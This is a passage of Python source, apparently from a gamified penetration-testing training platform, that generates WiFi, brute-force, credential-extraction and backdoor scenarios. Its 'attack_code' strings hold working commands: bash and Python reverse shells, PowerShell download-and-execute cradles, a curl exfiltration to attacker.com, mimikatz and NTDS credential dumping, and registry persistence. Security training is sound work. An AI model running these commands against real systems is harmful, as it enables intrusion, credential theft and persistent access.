            logger.error(f"Error building scenario from suggestion: {str(e)}")
            return {"error": f"Failed to build scenario: {str(e)}"}
    
    def _get_required_tools(self, vulnerability_type: str) -> List[str]:
        """Get required tools for a vulnerability type"""
        tool_mapping = {
            "sql_injection": ["burp_suite", "sqlmap", "manual_testing"],
            "xss": ["burp_suite", "xss_payloads", "browser_devtools"],
            "buffer_overflow": ["gdb", "pattern_create", "metasploit"],
            "command_injection": ["burp_suite", "manual_testing", "reverse_shell"],
            "privilege_escalation": ["linpeas", "winpeas", "manual_enumeration"],
            "web_vulnerabilities": ["burp_suite", "nikto", "dirb", "manual_testing"]
        }
        return tool_mapping.get(vulnerability_type, ["manual_testing"])
    
    async def build_scenario_from_expert_example(self, example_id: int, user_id: str = "default") -> Dict[str, Any]:
        """Build a scenario based on an expert example"""
        try:
            # Get the expert example
            expert_examples = await self.get_expert_examples()
            example = next((e for e in expert_examples if e["id"] == example_id), None)
            
            if not example:
                return {"error": "Expert example not found"}
            
            # Build scenario based on expert example
            scenario = {
                "name": f"Expert-Based: {example['scenario_name']}",
                "description": f"Master the techniques used in {example['scenario_name']}. This scenario is based on real-world expert solutions with a {example['success_rate']*100:.0f}% success rate.",
                "difficulty": example["difficulty"],
                "vulnerabilities": [example["vulnerability_type"]],
                "source": "Expert-Example",
                "techniques": example["techniques_used"],
                "ai_generated": False,
                "expert_based": True,
                "original_example": example,
                "requirements": f"Successfully exploit the {example['vulnerability_type']} vulnerability using the demonstrated techniques",
                "expected_outcome": f"Demonstrate mastery of {', '.join(example['techniques_used'])} techniques",
                "learning_objectives": f"Learn from expert solution: {example['expert_solution']}",
                "expert_solution": example["expert_solution"],
                "success_rate": example["success_rate"],
                "learning_value": example["learning_value"],
                "live_environment": {
                    "is_live": True,
                    "real_vulnerabilities": True,
                    "dynamic_content": True,
                    "interactive_elements": True,
                    "real_time_feedback": True,
                    "container_id": f"expert_{example_id}_{random.randint(1000, 9999)}",
                    "target_url": f"http://localhost:{8080 + random.randint(0, 9)}",
                    "port": 8080 + random.randint(0, 9)
                }
            }
            
            # Add sandbox-specific details
            scenario["sandbox_config"] = {
                "container_name": f"sandbox_expert_{example_id}",
                "vulnerability_types": [example["vulnerability_type"]],
                "difficulty_level": example["difficulty"],
                "estimated_duration": "1-2 hours",
                "required_tools": self._get_required_tools(example["vulnerability_type"]),
                "success_criteria": {
                    "exploit_vulnerability": True,
                    "achieve_objective": True,
                    "demonstrate_understanding": True,
                    "match_expert_techniques": True
                }
            }
            
            return scenario
            
        except Exception as e:
            logger.error(f"Error building scenario from expert example: {str(e)}")
            return {"error": f"Failed to build scenario: {str(e)}"} 

    async def generate_advanced_penetration_scenario(self, user_id: str, current_level: str, success_rate: float, 
                                                   vulnerability_type: str = None) -> Dict[str, Any]:
        """Generate advanced penetration testing scenarios with progressive difficulty"""
        try:
            # Calculate adaptive difficulty with increased challenge
            adaptive_difficulty = self.calculate_adaptive_difficulty(user_id, current_level, success_rate)
            
            # Add progressive scaling based on user performance
            progressive_multiplier = self._calculate_progressive_multiplier(user_id, success_rate)
            
            # Generate unique scenario ID
            scenario_id = f"adv_{vulnerability_type}_{user_id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
            
            # Generate scenario based on vulnerability type with enhanced uniqueness
            if vulnerability_type == "wifi_attack":
                scenario = await self._generate_wifi_attack_scenario(adaptive_difficulty, user_id, progressive_multiplier)
            elif vulnerability_type == "brute_force":
                scenario = await self._generate_brute_force_scenario(adaptive_difficulty, user_id, progressive_multiplier)
            elif vulnerability_type == "credential_extraction":
                scenario = await self._generate_credential_extraction_scenario(adaptive_difficulty, user_id, progressive_multiplier)
            elif vulnerability_type == "backdoor_creation":
                scenario = await self._generate_backdoor_scenario(adaptive_difficulty, user_id, progressive_multiplier)
            else:
                # Generate mixed scenario with multiple attack vectors
                scenario = await self._generate_mixed_penetration_scenario(adaptive_difficulty, user_id, progressive_multiplier)
            
            # Add unique scenario metadata
            scenario["scenario_id"] = scenario_id
            scenario["vulnerability_type"] = vulnerability_type
            scenario["user_id"] = user_id
            scenario["generation_timestamp"] = datetime.now().isoformat()
            scenario["difficulty"] = adaptive_difficulty
            scenario["complexity_score"] = scenario.get("complexity_score", 5.0) * progressive_multiplier
            
            # Add progressive difficulty scaling with enhanced rewards
            scenario["progressive_scaling"] = {
                "current_multiplier": progressive_multiplier,
                "next_threshold": self._calculate_next_threshold(user_id, success_rate),
                "xp_reward": self._calculate_xp_reward(adaptive_difficulty, scenario["complexity_score"]),
                "learning_score_increase": self._calculate_learning_score_increase(adaptive_difficulty),
                "success_rate": success_rate,
                "difficulty_progression": {
                    "current_level": current_level,
                    "next_level": self._get_next_difficulty_level(adaptive_difficulty),
                    "required_success_rate": self._calculate_next_threshold(user_id, success_rate)
                }
            }
            
            # Add live attack streaming capabilities
            scenario["live_streaming"] = {
                "enabled": True,
                "stream_id": f"attack_{scenario_id}",
                "real_time_logging": True,
                "step_tracking": True,
                "command_execution_log": True,
                "attack_details_tracking": True
            }
            
            # Add enhanced attack details structure
            scenario["attack_details"] = {
                "method": scenario.get("attack_method", "Advanced Penetration Testing"),
                "tools_used": scenario.get("tools", []),
                "duration": scenario.get("estimated_duration", "1-2 hours"),
                "success_rate": 0.3 + (progressive_multiplier * 0.1),  # Lower success rate for challenge
                "code_used": scenario.get("attack_code", ""),
                "steps_taken": scenario.get("steps", []),
                "exploits_found": scenario.get("exploits", []),
                "difficulty_multiplier": progressive_multiplier
            }
            
            return scenario
            
        except Exception as e:
            logger.error(f"Error generating advanced penetration scenario: {str(e)}")
            return self._get_fallback_scenario(adaptive_difficulty, vulnerability_type)

    def _get_next_difficulty_level(self, current_difficulty: str) -> str:
        """Get the next difficulty level for progression"""
        difficulty_progression = {
            "easy": "medium",
            "medium": "hard", 
            "hard": "expert",
            "expert": "master"
        }
        return difficulty_progression.get(current_difficulty, "expert")

    async def _generate_wifi_attack_scenario(self, difficulty: str, user_id: str, progressive_multiplier: float) -> Dict[str, Any]:
        """Generate WiFi attack scenarios with progressive difficulty"""
        scenarios = {
            "easy": {
                "name": "Basic WEP Network Cracking",
                "description": "Crack a WEP-protected WiFi network using basic tools",
                "target": "WEP-protected network",
                "tools": ["aircrack-ng", "airodump-ng", "aireplay-ng"],
                "steps": [
                    "Monitor wireless networks",
                    "Capture WEP packets",
                    "Generate traffic to capture IVs",
                    "Crack WEP key using aircrack-ng"
                ],
                "complexity_score": 3.0,
                "estimated_duration": "30-45 minutes",
                "attack_method": "Advanced Penetration Testing",
                "attack_code": """
# Basic WEP Network Cracking
sudo airodump-ng -c 6 --bssid 00:11:22:33:44:55 wlan0
sudo aireplay-ng -1 0 -a 00:11:22:33:44:55 wlan0
sudo aireplay-ng -3 -b 00:11:22:33:44:55 wlan0
sudo aircrack-ng -b 00:11:22:33:44:55 capture-01.cap
                """,
                "exploits": ["WEP IV Collision", "Packet Injection", "Key Recovery"]
            },
            "medium": {
                "name": "WPA2 Handshake Capture",
                "description": "Capture WPA2 handshake and crack password",
                "target": "WPA2-protected network",
                "tools": ["aircrack-ng", "hashcat", "crunch"],
                "steps": [
                    "Monitor target network",
                    "Deauthenticate clients",
                    "Capture handshake",
                    "Generate wordlist",
                    "Crack password with hashcat"
                ],
                "complexity_score": 6.0,
                "estimated_duration": "1-2 hours",
                "attack_method": "Advanced Penetration Testing",
                "attack_code": """
# WPA2 Handshake Capture
sudo airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w capture wlan0
sudo aireplay-ng -0 1 -a 00:11:22:33:44:55 wlan0
hashcat -m 2500 capture-01.hccapx /usr/share/wordlists/rockyou.txt
                """,
                "exploits": ["WPA2 Handshake Capture", "Deauthentication Attack", "Dictionary Attack"]
            },
            "hard": {
                "name": "Enterprise WiFi Attack",
                "description": "Attack WPA2-Enterprise network with Evil Twin",
                "target": "WPA2-Enterprise network",
                "tools": ["hostapd", "freeradius", "mimikatz"],
                "steps": [
                    "Set up Evil Twin access point",
                    "Configure RADIUS server",
                    "Capture user credentials",
                    "Extract domain credentials",
                    "Perform lateral movement"
                ],
                "complexity_score": 8.5,
                "estimated_duration": "2-3 hours",
                "attack_method": "Advanced Penetration Testing",
                "attack_code": """
# Enterprise WiFi Evil Twin Attack
sudo hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf
sudo freeradius -X
# Monitor for captured credentials
tail -f /var/log/freeradius/radius.log
                """,
                "exploits": ["Evil Twin Attack", "RADIUS Credential Capture", "Domain Credential Extraction"]
            },
            "expert": {
                "name": "Advanced WiFi Persistence",
                "description": "Establish persistent access through WiFi infrastructure",
                "target": "Corporate WiFi infrastructure",
                "tools": ["custom_scripts", "metasploit", "powershell_empire"],
                "steps": [
                    "Compromise WiFi controller",
                    "Deploy rogue access points",
                    "Implement credential harvesting",
                    "Establish C2 communication",
                    "Maintain persistence"
                ],
                "complexity_score": 9.5,
                "estimated_duration": "4-6 hours",
                "attack_method": "Advanced Penetration Testing",
                "attack_code": """
# Advanced WiFi Persistence
# Compromise WiFi controller
msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.1.100; set LPORT 4444; exploit'

# Deploy rogue AP
sudo airmon-ng start wlan0
sudo airbase-ng -e "Corporate_WiFi" -c 6 wlan0mon

# Establish C2
powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.100/empire.ps1')"
                """,
                "exploits": ["WiFi Controller Compromise", "Rogue AP Deployment", "C2 Communication", "Persistence Mechanisms"]
            }
        }
        
        # Apply progressive difficulty scaling
        base_scenario = scenarios.get(difficulty, scenarios["medium"]).copy()
        
        # Scale complexity and difficulty based on progressive multiplier
        base_scenario["complexity_score"] *= progressive_multiplier
        base_scenario["estimated_duration"] = f"{int(float(base_scenario['estimated_duration'].split('-')[0]) * progressive_multiplier)}-{int(float(base_scenario['estimated_duration'].split('-')[1].split()[0]) * progressive_multiplier)} hours"
        
        # Add progressive difficulty indicators
        base_scenario["progressive_difficulty"] = {
            "multiplier": progressive_multiplier,
            "scaled_complexity": base_scenario["complexity_score"],
            "difficulty_level": difficulty,
            "challenge_factor": progressive_multiplier
        }
        
        # Generate unique scenario ID with timestamp
        base_scenario["scenario_id"] = f"wifi_{user_id}_{datetime.now().strftime('%Y%m%d_%H%M%S_%f')}"
        base_scenario["vulnerability_type"] = "wifi_attack"
        base_scenario["difficulty"] = difficulty
        base_scenario["generation_timestamp"] = datetime.now().isoformat()
        
        return base_scenario

    async def _generate_brute_force_scenario(self, difficulty: str, user_id: str, progressive_multiplier: float) -> Dict[str, Any]:
        """Generate brute force attack scenarios with progressive difficulty"""
        scenarios = {
            "easy": {
                "name": "Basic SSH Brute Force",
                "description": "Brute force SSH login with common credentials",
                "target": "SSH service",
                "tools": ["hydra", "nmap", "medusa"],
                "steps": [
                    "Scan for SSH service",
                    "Identify valid usernames",
                    "Use common password lists",
                    "Execute brute force attack"
                ],
                "complexity_score": 2.5,
                "estimated_duration": "15-30 minutes",
                "attack_method": "Advanced Penetration Testing",
                "attack_code": """
# Basic SSH Brute Force
nmap -p 22 192.168.1.0/24
hydra -L users.txt -P passwords.txt ssh://192.168.1.100
medusa -h 192.168.1.100 -U users.txt -P passwords.txt -M ssh
                """,
                "exploits": ["SSH Service Discovery", "Username Enumeration", "Password Brute Force"]
            },
            "medium": {
                "name": "Advanced Web Application Brute Force",
                "description": "Brute force web application with rate limiting bypass",
                "target": "Web application login",
                "tools": ["burp_suite", "hydra", "custom_scripts"],
                "steps": [
                    "Analyze login mechanism",
                    "Bypass rate limiting",
                    "Use proxy rotation",
                    "Execute targeted brute force"
                ],
                "complexity_score": 5.5,
                "estimated_duration": "1-2 hours",
                "attack_method": "Advanced Penetration Testing",
                "attack_code": """
# Web Application Brute Force with Rate Limiting Bypass
# Configure Burp Suite for proxy
# Use Intruder with custom payloads
hydra -L users.txt -P passwords.txt -s 443 -S https://target.com/login
# Custom script for rate limiting bypass
python3 bypass_rate_limit.py --target https://target.com/login --users users.txt --passwords passwords.txt
                """,
                "exploits": ["Rate Limiting Bypass", "Proxy Rotation", "Custom Payload Injection"]
            },
            "hard": {
                "name": "Multi-Factor Authentication Bypass",
                "description": "Bypass MFA and brute force credentials",
                "target": "MFA-protected system",
                "tools": ["custom_tools", "social_engineering", "technical_exploitation"],
                "steps": [
                    "Analyze MFA implementation",
                    "Identify bypass techniques",
                    "Execute credential stuffing",
                    "Bypass MFA mechanisms"
                ],
                "complexity_score": 8.0,
                "estimated_duration": "2-4 hours",
                "attack_method": "Advanced Penetration Testing",
                "attack_code": """
# MFA Bypass and Brute Force
# Analyze MFA implementation
python3 mfa_analyzer.py --target https://target.com/login

# Bypass MFA using session fixation
curl -c cookies.txt -b cookies.txt -X POST https://target.com/login -d "user=admin&pass=password"
curl -c cookies.txt -b cookies.txt -X POST https://target.com/mfa -d "code=000000"

# Execute credential stuffing
python3 credential_stuffing.py --target https://target.com --users users.txt --passwords passwords.txt
                """,
                "exploits": ["MFA Implementation Analysis", "Session Fixation", "Credential Stuffing", "MFA Bypass"]
            },
            "expert": {
                "name": "Advanced Persistent Brute Force",
                "description": "Long-term brute force with advanced evasion",
                "target": "High-value target",
                "tools": ["custom_frameworks", "ai_enhanced_tools", "evasion_techniques"],
                "steps": [
                    "Implement AI-enhanced wordlists",
                    "Use advanced evasion techniques",
                    "Execute distributed attacks",
                    "Maintain persistence"
                ],
                "complexity_score": 9.0,
                "estimated_duration": "6-12 hours",
                "attack_method": "Advanced Penetration Testing",
                "attack_code": """
# Advanced Persistent Brute Force
# AI-enhanced wordlist generation
python3 ai_wordlist_generator.py --target company.com --output enhanced_wordlist.txt

# Distributed attack with evasion
python3 distributed_brute_force.py --targets targets.txt --wordlist enhanced_wordlist.txt --proxies proxy_list.txt --evasion

# Maintain persistence
python3 persistence_manager.py --target 192.168.1.100 --method ssh_key --backup_method cron
                """,
                "exploits": ["AI-Enhanced Wordlists", "Distributed Attacks", "Advanced Evasion", "Persistence Mechanisms"]
            }
        }
        
        # Apply progressive difficulty scaling
        base_scenario = scenarios.get(difficulty, scenarios["medium"]).copy()
        
        # Scale complexity and difficulty based on progressive multiplier
        base_scenario["complexity_score"] *= progressive_multiplier
        base_scenario["estimated_duration"] = f"{int(float(base_scenario['estimated_duration'].split('-')[0]) * progressive_multiplier)}-{int(float(base_scenario['estimated_duration'].split('-')[1].split()[0]) * progressive_multiplier)} hours"
        
        # Add progressive difficulty indicators
        base_scenario["progressive_difficulty"] = {
            "multiplier": progressive_multiplier,
            "scaled_complexity": base_scenario["complexity_score"],
            "difficulty_level": difficulty,
            "challenge_factor": progressive_multiplier
        }
        
        # Generate unique scenario ID with timestamp
        base_scenario["scenario_id"] = f"brute_{user_id}_{datetime.now().strftime('%Y%m%d_%H%M%S_%f')}"
        base_scenario["vulnerability_type"] = "brute_force"
        base_scenario["difficulty"] = difficulty
        base_scenario["generation_timestamp"] = datetime.now().isoformat()
        
        return base_scenario

    async def _generate_credential_extraction_scenario(self, difficulty: str, user_id: str, progressive_multiplier: float) -> Dict[str, Any]:
        """Generate credential extraction scenarios with progressive difficulty"""
        scenarios = {
            "easy": {
                "name": "Basic Memory Dumping",
                "description": "Extract credentials from process memory",
                "target": "Running processes",
                "tools": ["procdump", "mimikatz", "wireshark"],
                "steps": [
                    "Identify target processes",
                    "Dump process memory",
                    "Extract plaintext passwords",
                    "Analyze extracted data"
                ],
                "complexity_score": 4.0,
                "estimated_duration": "30-60 minutes",
                "attack_method": "Advanced Penetration Testing",
                "attack_code": """
# Basic Memory Dumping
# Identify target processes
tasklist /v | findstr "chrome firefox outlook"

# Dump process memory
procdump -ma chrome.exe chrome.dmp
procdump -ma firefox.exe firefox.dmp

# Extract credentials with mimikatz
mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
sekurlsa::tickets /export
                """,
                "exploits": ["Process Memory Dumping", "Plaintext Password Extraction", "Ticket Extraction"]
            },
            "medium": {
                "name": "LSASS Memory Extraction",
                "description": "Extract credentials from LSASS process",
                "target": "Windows system",
                "tools": ["mimikatz", "procdump", "wce"],
                "steps": [
                    "Bypass antivirus",
                    "Dump LSASS memory",
                    "Extract NTLM hashes",
                    "Perform pass-the-hash"
                ],
                "complexity_score": 6.5,
                "estimated_duration": "1-2 hours",
                "attack_method": "Advanced Penetration Testing",
                "attack_code": """
# LSASS Memory Extraction
# Bypass antivirus and dump LSASS
procdump -accepteula -ma lsass.exe lsass.dmp

# Extract credentials with mimikatz
mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
lsadump::sam
lsadump::secrets

# Perform pass-the-hash
wce.exe -s username:domain:lmhash:nthash
                """,
                "exploits": ["LSASS Memory Dumping", "NTLM Hash Extraction", "Pass-the-Hash Attack"]
            },
            "hard": {
                "name": "Advanced Credential Harvesting",
                "description": "Extract credentials from multiple sources",
                "target": "Enterprise environment",
                "tools": ["custom_tools", "powershell", "registry_analysis"],
                "steps": [
                    "Extract from registry",
                    "Analyze browser data",
                    "Extract from databases",
                    "Perform lateral movement"
                ],
                "complexity_score": 8.5,
                "estimated_duration": "2-4 hours",
                "attack_method": "Advanced Penetration Testing",
                "attack_code": """
# Advanced Credential Harvesting
# Extract from registry
reg query "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings" /v ProxyServer
reg query "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings" /v ProxyEnable

# Analyze browser data
python3 browser_credential_extractor.py --browser chrome --output credentials.txt
python3 browser_credential_extractor.py --browser firefox --output credentials.txt

# Extract from databases
python3 database_credential_extractor.py --connection "server=192.168.1.100;database=master" --output db_creds.txt

# PowerShell credential extraction
powershell -c "Get-WmiObject -Class Win32_ComputerSystem | Select-Object Name,Domain"
                """,
                "exploits": ["Registry Credential Extraction", "Browser Data Analysis", "Database Credential Harvesting", "PowerShell Credential Extraction"]
            },
            "expert": {
                "name": "Enterprise Credential Compromise",
                "description": "Compromise enterprise-wide credentials",
                "target": "Active Directory",
                "tools": ["custom_frameworks", "powershell_empire", "bloodhound"],
                "steps": [
                    "Compromise domain controller",
                    "Extract all domain credentials",
                    "Analyze trust relationships",
                    "Establish persistence"
                ],
                "complexity_score": 9.5,
                "estimated_duration": "4-8 hours",
                "attack_method": "Advanced Penetration Testing",
                "attack_code": """
# Enterprise Credential Compromise
# Compromise domain controller
powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.100/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"

# Extract all domain credentials
ntdsutil "ac i ntds" "ifm" "create full c:\\temp" q q
secretsdump.py -ntds ntds.dit -system SYSTEM -outputfile domain_creds.txt

# Analyze trust relationships with BloodHound
bloodhound.py -u username -p password -d domain.com -c All

# Establish persistence
powershell -c "New-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'UpdateService' -Value 'C:\\Windows\\System32\\svchost.exe'"
                """,
                "exploits": ["Domain Controller Compromise", "NTDS Dumping", "BloodHound Analysis", "Enterprise Persistence"]
            }
        }
        
        # Apply progressive difficulty scaling
        base_scenario = scenarios.get(difficulty, scenarios["medium"]).copy()
        
        # Scale complexity and difficulty based on progressive multiplier
        base_scenario["complexity_score"] *= progressive_multiplier
        base_scenario["estimated_duration"] = f"{int(float(base_scenario['estimated_duration'].split('-')[0]) * progressive_multiplier)}-{int(float(base_scenario['estimated_duration'].split('-')[1].split()[0]) * progressive_multiplier)} hours"
        
        # Add progressive difficulty indicators
        base_scenario["progressive_difficulty"] = {
            "multiplier": progressive_multiplier,
            "scaled_complexity": base_scenario["complexity_score"],
            "difficulty_level": difficulty,
            "challenge_factor": progressive_multiplier
        }
        
        # Generate unique scenario ID with timestamp
        base_scenario["scenario_id"] = f"cred_{user_id}_{datetime.now().strftime('%Y%m%d_%H%M%S_%f')}"
        base_scenario["vulnerability_type"] = "credential_extraction"
        base_scenario["difficulty"] = difficulty
        base_scenario["generation_timestamp"] = datetime.now().isoformat()
        
        return base_scenario

    async def _generate_backdoor_scenario(self, difficulty: str, user_id: str, progressive_multiplier: float) -> Dict[str, Any]:
        """Generate backdoor creation scenarios with progressive difficulty"""
        scenarios = {
            "easy": {
                "name": "Basic Reverse Shell",
                "description": "Create simple reverse shell backdoor",
                "target": "Target system",
                "tools": ["netcat", "python", "bash"],
                "steps": [
                    "Create reverse shell payload",
                    "Transfer to target",
                    "Execute payload",
                    "Establish connection"
                ],
                "complexity_score": 3.5,
                "estimated_duration": "30-45 minutes",
                "attack_method": "Advanced Penetration Testing",
                "attack_code": """
# Basic Reverse Shell Backdoor
# Create reverse shell payload
bash -i >& /dev/tcp/192.168.1.100/4444 0>&1

# Python reverse shell
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.100",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"]);'

# Transfer and execute
scp backdoor.sh user@target:/tmp/
ssh user@target "chmod +x /tmp/backdoor.sh && /tmp/backdoor.sh"
                """,
                "exploits": ["Reverse Shell Creation", "Payload Transfer", "Remote Execution"]
            },
            "medium": {
                "name": "Advanced Backdoor with Encryption",
                "description": "Create encrypted backdoor with persistence",
                "target": "Target system",
                "tools": ["custom_scripts", "openssl", "cron"],
                "steps": [
                    "Create encrypted payload",
                    "Implement persistence",
                    "Bypass detection",
                    "Establish C2"
                ],
                "complexity_score": 6.5,
                "estimated_duration": "1-2 hours",
                "attack_method": "Advanced Penetration Testing",
                "attack_code": """
# Advanced Encrypted Backdoor
# Create encrypted payload
openssl enc -aes-256-cbc -salt -in backdoor.py -out backdoor.enc -k "secret_key"

# Implement persistence via cron
echo "*/5 * * * * /usr/bin/python3 /tmp/backdoor.enc" | crontab -

# Bypass detection with obfuscation
python3 -c "import base64; exec(base64.b64decode('cHJpbnQoIkhlbGxvIFdvcmxkIik='))"

# Establish C2 communication
curl -s https://attacker.com/c2.php -d "data=$(whoami)" --silent
                """,
                "exploits": ["Encrypted Payload Creation", "Cron Persistence", "Obfuscation Techniques", "C2 Communication"]
            },
            "hard": {
                "name": "Process Injection Backdoor",
                "description": "Create backdoor using process injection",
                "target": "Running processes",
                "tools": ["custom_tools", "metasploit", "powershell"],
                "steps": [
                    "Analyze target processes",
                    "Create injection payload",
                    "Execute process injection",
                    "Maintain stealth"
                ],
                "complexity_score": 8.0,
                "estimated_duration": "2-3 hours",
                "attack_method": "Advanced Penetration Testing",
                "attack_code": """
# Process Injection Backdoor
# Analyze target processes
tasklist /v | findstr "explorer.exe"

# Create injection payload with msfvenom
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw > payload.bin

# Execute process injection
powershell -c "Invoke-ProcessInjection -ProcessName explorer.exe -Payload payload.bin"

# Maintain stealth with DLL injection
rundll32.exe shell32.dll,ShellExec_RunDLL calc.exe
                """,
                "exploits": ["Process Analysis", "Payload Creation", "Process Injection", "Stealth Techniques"]
            },
            "expert": {
                "name": "Advanced Persistent Threat Backdoor",
                "description": "Create APT-level backdoor with advanced evasion",
                "target": "High-security environment",
                "tools": ["custom_frameworks", "ai_enhanced_tools", "advanced_evasion"],
                "steps": [
                    "Implement AI-enhanced evasion",
                    "Create polymorphic payload",
                    "Establish multiple C2 channels",
                    "Maintain long-term persistence"
                ],
                "complexity_score": 9.5,
                "estimated_duration": "4-8 hours",
                "attack_method": "Advanced Penetration Testing",
                "attack_code": """
# Advanced Persistent Threat Backdoor
# AI-enhanced evasion techniques
python3 ai_evasion_generator.py --target windows --output polymorphic_payload.py

# Create polymorphic payload
python3 polymorphic_engine.py --input backdoor.py --output polymorphic_backdoor.py --mutation_rate 0.3

# Establish multiple C2 channels
python3 multi_c2_manager.py --channels "https://c2-1.com,https://c2-2.com,https://c2-3.com" --rotation 30

# Maintain long-term persistence
powershell -c "New-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'WindowsUpdate' -Value 'C:\\Windows\\System32\\svchost.exe -k netsvcs'"
reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" /v Shell /t REG_SZ /d "explorer.exe,backdoor.exe" /f
                """,
                "exploits": ["AI-Enhanced Evasion", "Polymorphic Payload Creation", "Multi-C2 Communication", "Advanced Persistence"]
            }
        }
        
        # Apply progressive difficulty scaling
        base_scenario = scenarios.get(difficulty, scenarios["medium"]).copy()
        
        # Scale complexity and difficulty based on progressive multiplier
        base_scenario["complexity_score"] *= progressive_multiplier
        base_scenario["estimated_duration"] = f"{int(float(base_scenario['estimated_duration'].split('-')[0]) * progressive_multiplier)}-{int(float(base_scenario['estimated_duration'].split('-')[1].split()[0]) * progressive_multiplier)} hours"
        
        # Add progressive difficulty indicators
        base_scenario["progressive_difficulty"] = {
            "multiplier": progressive_multiplier,
            "scaled_complexity": base_scenario["complexity_score"],
            "difficulty_level": difficulty,
            "challenge_factor": progressive_multiplier
        }
        
        # Generate unique scenario ID with timestamp
        base_scenario["scenario_id"] = f"backdoor_{user_id}_{datetime.now().strftime('%Y%m%d_%H%M%S_%f')}"
        base_scenario["vulnerability_type"] = "backdoor_creation"
        base_scenario["difficulty"] = difficulty
        base_scenario["generation_timestamp"] = datetime.now().isoformat()
        
        return base_scenario

    async def _generate_mixed_penetration_scenario(self, difficulty: str, user_id: str, progressive_multiplier: float) -> Dict[str, Any]:
        """Generate mixed penetration testing scenarios with multiple attack vectors"""
        scenarios = {
            "easy": {
                "name": "Basic Network Penetration",
                "description": "Basic network penetration with multiple attack vectors",
                "target": "Small network",
                "attack_vectors": ["network_scanning", "basic_exploitation", "credential_harvesting"],
                "complexity_score": 4.0,
                "estimated_duration": "1-2 hours",
                "attack_method": "Advanced Penetration Testing",
                "attack_vectors": ["network_scanning", "basic_exploitation", "credential_harvesting"],
                "complexity_score": 4.0,
                "estimated_duration": "1-2 hours"
            },
            "medium": {
                "name": "Advanced Web Application Penetration",
                "description": "Comprehensive web application penetration testing",
                "target": "Web application",
                "attack_vectors": ["sql_injection", "xss", "file_upload", "privilege_escalation"],
                "complexity_score": 7.0,
                "estimated_duration": "2-4 hours",
                "attack_method": "Advanced Penetration Testing",
                "attack_vectors": ["sql_injection", "xss", "file_upload", "privilege_escalation"],
                "complexity_score": 7.0,
                "estimated_duration": "2-4 hours"
            },
            "hard": {
                "name": "Enterprise Network Penetration",
                "description": "Full enterprise network penetration with lateral movement",
                "target": "Enterprise network",
                "attack_vectors": ["initial_access", "lateral_movement", "privilege_escalation", "persistence"],
                "complexity_score": 8.5,
                "estimated_duration": "4-8 hours",
                "attack_method": "Advanced Penetration Testing",
                "attack_vectors": ["initial_access", "lateral_movement", "privilege_escalation", "persistence"],
                "complexity_score": 8.5,
                "estimated_duration": "4-8 hours"
            },
            "expert": {
                "name": "Advanced Persistent Threat Simulation",
                "description": "APT-level penetration testing with advanced techniques",
                "target": "High-security environment",
                "attack_vectors": ["social_engineering", "zero_day_exploitation", "advanced_persistence", "data_exfiltration"],
                "complexity_score": 9.5,
                "estimated_duration": "8-16 hours",
                "attack_method": "Advanced Penetration Testing",
                "attack_vectors": ["social_engineering", "zero_day_exploitation", "advanced_persistence", "data_exfiltration"],
                "complexity_score": 9.5,
                "estimated_duration": "8-16 hours"
            }
        }
        
        scenario = scenarios.get(difficulty, scenarios["medium"])
        scenario["vulnerability_type"] = "mixed_penetration"
        scenario["difficulty"] = difficulty
        scenario["scenario_id"] = f"mixed_{user_id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
        
        return scenario

    def _calculate_progressive_multiplier(self, user_id: str, success_rate: float) -> float:
        """Calculate progressive difficulty multiplier based on success rate"""
        base_multiplier = 1.0
        
        if success_rate > 0.9:
            base_multiplier = 2.5  # x2.5 for very high success
        elif success_rate > 0.8:
            base_multiplier = 2.0  # x2.0 for high success
        elif success_rate > 0.7:
            base_multiplier = 1.5  # x1.5 for good success
        elif success_rate > 0.6:
            base_multiplier = 1.2  # x1.2 for moderate success
        
        # Add time-based acceleration
        if user_id in self.ai_progress_tracker:
            tracker = self.ai_progress_tracker[user_id]
            time_acceleration = min(0.5, len(tracker.get("difficulty_history", [])) * 0.1)
            base_multiplier += time_acceleration
        
        return min(3.0, base_multiplier)  # Cap at x3.0

    def _calculate_next_threshold(self, user_id: str, success_rate: float) -> float:
        """Calculate next success rate threshold for difficulty increase"""
        current_threshold = 0.7  # Base threshold
        
        if user_id in self.ai_progress_tracker:
            tracker = self.ai_progress_tracker[user_id]
            completed_scenarios = len(tracker.get("difficulty_history", []))
            
            # Increase threshold based on experience
            threshold_increase = min(0.2, completed_scenarios * 0.02)
            current_threshold += threshold_increase
        
        return min(0.95, current_threshold)  # Cap at 95%

    def _calculate_xp_reward(self, difficulty: str, complexity_score: float) -> int:
        """Calculate XP reward for completing scenario"""
        base_xp = {
            "easy": 100,
            "medium": 250,
            "hard": 500,
            "expert": 1000
        }
        
        base = base_xp.get(difficulty, 100)
        complexity_bonus = int(complexity_score * 50)
        
        return base + complexity_bonus

    def _calculate_learning_score_increase(self, difficulty: str) -> float:
        """Calculate learning score increase for completing scenario"""
        base_increase = {
            "easy": 0.1,
            "medium": 0.25,
            "hard": 0.5,
            "expert": 1.0
        }
        
        return base_increase.get(difficulty, 0.1)

    async def log_attack_step(self, scenario_id: str, user_id: str, step_data: Dict[str, Any]) -> bool:
        """Log an attack step for live streaming"""
        try:
            conn = sqlite3.connect(self.attack_logs_db)
            cursor = conn.cursor()
            
            cursor.execute('''
                INSERT INTO attack_logs 
